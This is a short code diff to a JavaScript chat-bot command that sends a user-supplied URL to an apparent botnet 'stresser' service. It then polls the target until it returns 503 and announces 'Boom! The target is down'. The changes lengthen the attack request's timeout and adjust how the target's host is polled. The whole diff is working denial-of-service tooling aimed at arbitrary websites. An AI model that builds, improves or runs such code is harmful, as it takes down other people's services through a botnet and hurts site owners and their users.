@@ -27,7 +27,7 @@ module.exports["run"] = async ({ args, chat, font }) => {
     
     try {
         const response = await axios.get(`https://haji-mix-botnet.onrender.com/stresser?url=${encodeURIComponent(url)}`, {
-            timeout: 10000
+            timeout: 30000
         });
 
         initiate.unsend();
@@ -35,7 +35,7 @@ module.exports["run"] = async ({ args, chat, font }) => {
 
         const checkInterval = setInterval(async () => {
             try {
-                const checkStatus = await axios.get(url);
+                const checkStatus = await axios.get(url.match(/^(https?:\/\/[^\/]+)/)[0]);
 
                 if (checkStatus.status === 503) {
                     chat.reply(thin("Boom! The target is down (503 Service Unavailable)."));
